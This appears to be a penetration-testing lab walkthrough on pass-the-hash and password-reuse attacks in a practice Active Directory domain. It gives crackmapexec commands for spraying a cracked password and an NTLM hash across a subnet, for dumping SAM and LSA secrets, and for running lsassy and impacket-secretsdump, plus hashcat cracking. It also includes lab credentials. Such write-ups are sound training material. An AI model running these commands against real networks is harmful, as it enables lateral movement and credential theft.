# Pass Attacks

The attacker already has valid credentials or password hashes from earlier steps (e.g., via LLMNR poisoning, credential dumping, or cracked passwords). The goal is to reuse these credentials to move laterally within the environment.
This includes:

- **Pass-the-Hash (PtH)**: Reusing NTLM hashes.

- **Pass-the-Ticket (PtT)**: Reusing Kerberos tickets.

- **Plain Password Reuse**: Logging in with cracked passwords.

## Walkthrough

- Use tools like crackmapexec to spray credentials or hashes across the subnet. From our initial llmnr poisoning attack vector we did capture and crack the password of fcastle, we will spray that password on the subnet and see if we have access on other machines:

```
crackmapexec smb 10.0.2.0/24 -u fcastle -d MARVEL.local -p 'Password1!'
```

```{figure} ../../../_static/AD/crackmap1.png
:alt: Crackmap
:width: 100%
:align: center
```

→ Found local admin access on THEPUNISHER and SPIDERMAN.

- Test for local admin reuse with NTLM hashes. From our initial SMB relay attack we did dump the local SAM hashes, we will spray the hash of the local admin account found and see if this organization is reusing it:

```
crackmapexec smb 10.0.2.0/24 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f' --local-auth
```

```{figure} ../../../_static/AD/crackmap2.png
:alt: Crackmap
:width: 100%
:align: center
```

→ Same local administrator account reused across machines.

- Dump sensitive info (SAM, LSA secrets, shares):

```
crackmapexec smb 10.0.2.0/24 -u administrator -H <hash> --local-auth --sam
crackmapexec smb 10.0.2.0/24 -u administrator -H <hash> --local-auth --shares
crackmapexec smb 10.0.2.0/24 -u administrator -H <hash> --local-auth --lsa
```

- Dump and reuse hashes with lsassy or impacket-secretsdump:

```
crackmapexec smb 10.0.2.0/24 -u administrator -H <hash> --local-auth -M lsassy
impacket-secretsdump administrator:@10.0.2.16 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
impacket-secretsdump MARVEL.local/fcastle:'Password1!'@10.0.2.16
```

- Try to crack captured NTLM hash to recover plaintext password:

```
hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt
```

- Crackmap DB

```{figure} ../../../_static/AD/crackmap-db.png
:alt: Crackmap DB
:width: 100%
:align: center
```

**Process Thought:**

1. Captured fcastle hash via LLMNR.
2. Cracked → Password1!.
3. Sprayed password across subnet.
4. Found new logins → dumped hashes.
5. Resprayed with local admin hashes.
